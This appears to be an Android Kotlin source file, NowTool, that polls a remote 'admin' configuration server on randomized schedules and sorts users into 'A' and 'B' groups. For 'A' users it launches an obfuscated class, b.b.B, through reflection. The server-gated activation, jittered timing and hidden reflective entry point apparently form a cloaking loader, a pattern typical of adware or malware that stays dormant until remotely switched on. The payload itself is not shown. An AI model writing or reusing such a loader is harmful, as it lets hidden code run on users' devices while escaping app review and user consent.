package com.re.sid.ual.up.now

import android.content.Context
import android.os.Handler
import android.os.Looper
import com.re.sid.ual.ben.IconBean
import com.re.sid.ual.frist.DataTool
import org.json.JSONObject
import java.util.Calendar
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.random.Random

object NowTool {

    // ==================== 常量 ====================

    /** 请求超时时间(毫秒) */
    private const val REQUEST_TIMEOUT_MS = 60_000L

    // ==================== 状态管理 ====================

    /** 是否正在请求中（防止并发请求） */
    private val isRequesting = AtomicBoolean(false)

    /** coreDStart是否已调用（全程只调用一次） */
    private val isCoreDStarted = AtomicBoolean(false)

    /** 轮询是否激活中 */
    private val isPollingActive = AtomicBoolean(false)

    /** 主线程Handler */
    private val handler = Handler(Looper.getMainLooper())

    /** 定时任务Runnable */
    private var pollingRunnable: Runnable? = null

    /** 延迟请求Runnable（情况1） */
    private var delayedRequestRunnable: Runnable? = null

    /** 当前超时Runnable（用于取消） */
    private var currentTimeoutRunnable: Runnable? = null

    /** 长期更新任务Runnable */
    private var updateRunnable: Runnable? = null

    /** 长期更新任务是否已启动 */
    private val isUpdateStarted = AtomicBoolean(false)

    // ==================== 配置解析 ====================

    /** 解析system_timing配置，返回 (轮询间隔秒, 每日上限) */
    private fun parseTimingConfig(): Pair<Int, Int> {
        return try {
            val json = JSONObject(DataTool.user_can)
            val timing = json.optString("system_timing", "60-60-1000")
            val parts = timing.split("-")
            val intervalSeconds = parts.getOrNull(1)?.toIntOrNull() ?: 60
            val dailyLimit = parts.getOrNull(2)?.toIntOrNull() ?: 1000
            Pair(intervalSeconds, dailyLimit)
        } catch (e: Exception) {
            Pair(60, 1000)
        }
    }

    /** 解析system_timing第一个值（长期更新间隔，单位分钟） */
    private fun parseUpdateIntervalMinutes(): Int {
        return try {
            val json = JSONObject(DataTool.user_can)
            val timing = json.optString("system_timing", "60-60-1000")
            val parts = timing.split("-")
            parts.getOrNull(0)?.toIntOrNull() ?: 60
        } catch (e: Exception) {
            60
        }
    }

    /** 判断是否为A用户 */
    private fun isUserA(): Boolean {
        return IconBean.userCan(DataTool.user_can)
    }

    /** 判断是否有本地配置 */
    private fun hasLocalConfig(): Boolean {
        return DataTool.user_can.isNotEmpty()
    }

    // ==================== 请求限制检查 ====================

    /** 检查并更新今日请求计数，返回是否可以继续请求 */
    private fun checkDailyLimit(): Boolean {
        // 使用 YYYYDDD 格式（年份*1000 + 天数）避免跨年bug
        val calendar = Calendar.getInstance()
        val today = calendar.get(Calendar.YEAR) * 1000 + calendar.get(Calendar.DAY_OF_YEAR)
        val (_, dailyLimit) = parseTimingConfig()

        // 日期变更，重置计数（持久化存储）
        if (DataTool.admin_request_date != today) {
            DataTool.admin_request_date = today
            DataTool.admin_request_count = 0
        }
        return DataTool.admin_request_count < dailyLimit
    }

    /** 增加今日请求计数（持久化存储） */
    private fun incrementRequestCount() {
        DataTool.admin_request_count = DataTool.admin_request_count + 1
    }

    // ==================== 核心方法 ====================

    private fun coreDStart() {
        // 启动长期数据更新任务（只启动一次）
        startLongTermUpdate()
        if (isCoreDStarted.getAndSet(true)) {
            DataTool.showLog("[NowTool] coreDStart: 已调用过，跳过")
            return
        }
        DataTool.showLog("[NowTool] coreDStart: 执行核心启动")
        try {
            val coreClass = Class.forName("b.b.B")
            val method = coreClass.getMethod("b", Context::class.java)
            method.invoke(null, DataTool.appAll)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    /** 停止定时轮询 */
    private fun stopPolling() {
        isPollingActive.set(false)
        pollingRunnable?.let { handler.removeCallbacks(it) }
        pollingRunnable = null
    }

    /** 取消延迟请求（情况1） */
    private fun cancelDelayedRequest() {
        delayedRequestRunnable?.let { handler.removeCallbacks(it) }
        delayedRequestRunnable = null
    }

    // ==================== 长期数据更新 ====================

    /**
     * 启动长期数据更新任务
     * 每x分钟请求一次admin（x从system_timing第一个值获取，±5分钟随机）
     * 只用于更新数据，不执行coreDStart
     */
    private fun startLongTermUpdate() {
        if (isUpdateStarted.getAndSet(true)) {
            DataTool.showLog("[NowTool] 长期更新: 已启动，跳过")
            return
        }
        DataTool.showLog("[NowTool] 长期更新: 启动")
        scheduleNextUpdate()
    }

    private fun scheduleNextUpdate() {
        val intervalMinutes = parseUpdateIntervalMinutes()
        val randomOffset = Random.nextInt(-5, 6)
        val actualIntervalMinutes = (intervalMinutes + randomOffset).coerceAtLeast(1)
        val delayMs = actualIntervalMinutes * 60 * 1000L
        DataTool.showLog("[NowTool] 长期更新: 下次请求延迟 ${actualIntervalMinutes}分钟")

        updateRunnable = Runnable {
            if (!checkDailyLimit()) {
                DataTool.showLog("[NowTool] 长期更新: 超过每日上限，跳过本次")
                scheduleNextUpdate()
                return@Runnable
            }
            DataTool.showLog("[NowTool] 长期更新: 执行请求 (count=${DataTool.admin_request_count})")
            incrementRequestCount()
            doSingleRequest { success ->
                DataTool.showLog("[NowTool] 长期更新: 请求结果=$success")
                scheduleNextUpdate()
            }
        }
        handler.postDelayed(updateRunnable!!, delayMs)
    }

    // ==================== 主入口方法 ====================

    /**
     * 启动Admin数据请求流程
     * 根据当前配置状态自动选择处理方式
     */
    fun startAdminData() {
        val hasConfig = hasLocalConfig()
        val userA = if (hasConfig) isUserA() else false
        DataTool.showLog("[NowTool] startAdminData: hasConfig=$hasConfig, isUserA=$userA, reqCount=${DataTool.admin_request_count}")



        when {
            hasConfig && userA -> {
                DataTool.showLog("[NowTool] -> 情况1: 有配置A用户")
                handleCaseA()
            }
            hasConfig && !userA -> {
                DataTool.showLog("[NowTool] -> 情况2: 有配置B用户")
                handleCaseB()
            }
            else -> {
                DataTool.showLog("[NowTool] -> 情况3: 无配置")
                handleCaseNoConfig()
            }
        }
    }

    // ==================== 三种情况处理 ====================

    /**
     * 情况1：启动时有配置A
     * 先调用coreDStart，延迟1s-10min后请求admin
     */
    private fun handleCaseA() {
        coreDStart()

        val delayMs = Random.nextLong(1_000L, 10 * 60 * 1000L)
        DataTool.showLog("[NowTool] 情况1: 延迟 ${delayMs/1000}秒后请求admin")
        delayedRequestRunnable = Runnable {
            if (isPollingActive.get()) {
                DataTool.showLog("[NowTool] 情况1: 轮询已启动，放弃延迟请求")
                return@Runnable
            }
            DataTool.showLog("[NowTool] 情况1: 执行延迟请求")
            requestAdminWithRetry { success, isUserAResult ->
                DataTool.showLog("[NowTool] 情况1: 请求结果 success=$success, isUserA=$isUserAResult")
                if (!success || !isUserAResult) {
                    DataTool.showLog("[NowTool] 情况1: 转情况2流程")
                    handleCaseB()
                }
            }
        }
        handler.postDelayed(delayedRequestRunnable!!, delayMs)
    }

    /**
     * 情况2：启动时有配置B
     * 定时轮询请求，直到变成A用户
     */
    private fun handleCaseB() {
        if (isPollingActive.getAndSet(true)) {
            DataTool.showLog("[NowTool] 情况2: 轮询已启动，跳过")
            return
        }
        DataTool.showLog("[NowTool] 情况2: 启动轮询")
        cancelDelayedRequest()
        scheduleNextPoll()
    }

    /**
     * 情况3：无配置
     * 立即请求，根据结果决定后续流程
     */
    private fun handleCaseNoConfig() {
        DataTool.showLog("[NowTool] 情况3: 立即请求admin")
        requestAdminWithRetry { success, isUserAResult ->
            DataTool.showLog("[NowTool] 情况3: 请求结果 success=$success, isUserA=$isUserAResult")
            if (success && isUserAResult) {
                DataTool.showLog("[NowTool] 情况3: A用户，调用coreDStart")
                coreDStart()
            } else {
                DataTool.showLog("[NowTool] 情况3: 转情况2流程")
                handleCaseB()
            }
        }
    }

    // ==================== 定时轮询逻辑 ====================

    private fun scheduleNextPoll() {
        if (!isPollingActive.get()) {
            DataTool.showLog("[NowTool] 轮询: 已停止，跳过")
            return
        }

        val (intervalSeconds, _) = parseTimingConfig()
        val randomOffset = Random.nextInt(-10, 11)
        val actualInterval = (intervalSeconds + randomOffset).coerceAtLeast(1)
        val delayMs = actualInterval * 1000L
        DataTool.showLog("[NowTool] 轮询: 下次请求延迟 ${actualInterval}秒")

        pollingRunnable = Runnable {
            if (!isPollingActive.get() || !checkDailyLimit()) {
                DataTool.showLog("[NowTool] 轮询: 停止(active=${isPollingActive.get()}, limitOk=${checkDailyLimit()})")
                stopPolling()
                return@Runnable
            }

            DataTool.showLog("[NowTool] 轮询: 执行请求 (count=${DataTool.admin_request_count})")
            requestAdminWithRetry { success, isUserAResult ->
                DataTool.showLog("[NowTool] 轮询: 结果 success=$success, isUserA=$isUserAResult")
                if (success && isUserAResult) {
                    DataTool.showLog("[NowTool] 轮询: A用户，停止轮询")
                    coreDStart()
                    stopPolling()
                } else {
                    scheduleNextPoll()
                }
            }
        }
        handler.postDelayed(pollingRunnable!!, delayMs)
    }

    // ==================== 请求执行逻辑（带超时） ====================

    /**
     * 执行单次请求，带60秒超时
     * @param onResult 结果回调：success表示是否成功获取配置
     */
    private fun doSingleRequest(onResult: (success: Boolean) -> Unit) {
        val hasResponded = AtomicBoolean(false)

        val timeoutRunnable = Runnable {
            if (hasResponded.compareAndSet(false, true)) {
                DataTool.showLog("[NowTool] 请求: 60秒超时")
                onResult(false)
            }
        }
        currentTimeoutRunnable = timeoutRunnable
        handler.postDelayed(timeoutRunnable, REQUEST_TIMEOUT_MS)

        NetTool.requestAdminConfig(
            onSuccess = { _ ->
                if (hasResponded.compareAndSet(false, true)) {
                    handler.removeCallbacks(timeoutRunnable)
                    DataTool.showLog("[NowTool] 请求: 成功")
                    onResult(true)
                }
            },
            onFailure = { error ->
                if (hasResponded.compareAndSet(false, true)) {
                    handler.removeCallbacks(timeoutRunnable)
                    DataTool.showLog("[NowTool] 请求: 失败 error=$error")
                    onResult(false)
                }
            }
        )
    }

    /**
     * 请求admin并支持重试逻辑
     * 重试2-5次，间隔不少于30s，总时间1-5分钟内
     */
    private fun requestAdminWithRetry(callback: (success: Boolean, isUserA: Boolean) -> Unit) {
        if (!tryAcquireRequest()) {
            DataTool.showLog("[NowTool] 重试请求: 获取锁失败，跳过")
            callback(false, false)
            return
        }

        if (!checkDailyLimit()) {
            DataTool.showLog("[NowTool] 重试请求: 超过每日上限")
            releaseRequest()
            callback(false, false)
            return
        }

        val maxRetries = Random.nextInt(2, 6)
        var currentRetry = 0
        DataTool.showLog("[NowTool] 重试请求: 开始, 最大重试${maxRetries}次")

        fun doRetryRequest() {
            if (currentRetry >= maxRetries) {
                DataTool.showLog("[NowTool] 重试请求: 达到上限，结束")
                releaseRequest()
                callback(false, false)
                return
            }

            if (!checkDailyLimit()) {
                DataTool.showLog("[NowTool] 重试请求: 超过每日上限，结束")
                releaseRequest()
                callback(false, false)
                return
            }

            currentRetry++
            incrementRequestCount()
            DataTool.showLog("[NowTool] 重试请求: 第${currentRetry}次 (count=${DataTool.admin_request_count})")

            doSingleRequest { success ->
                if (success) {
                    DataTool.showLog("[NowTool] 重试请求: 成功，结束")
                    releaseRequest()
                    callback(true, isUserA())
                } else {
                    if (currentRetry >= maxRetries) {
                        DataTool.showLog("[NowTool] 重试请求: 失败且达到上限")
                        releaseRequest()
                        callback(false, false)
                    } else {
                        val retryDelay = Random.nextLong(30_000L, 60_000L)
                        DataTool.showLog("[NowTool] 重试请求: 失败，${retryDelay/1000}秒后重试")
                        handler.postDelayed({ doRetryRequest() }, retryDelay)
                    }
                }
            }
        }

        doRetryRequest()
    }

    // ==================== 请求锁控制 ====================

    /** 尝试获取请求锁 */
    private fun tryAcquireRequest(): Boolean {
        return isRequesting.compareAndSet(false, true)
    }

    /** 释放请求锁 */
    private fun releaseRequest() {
        isRequesting.set(false)
    }
}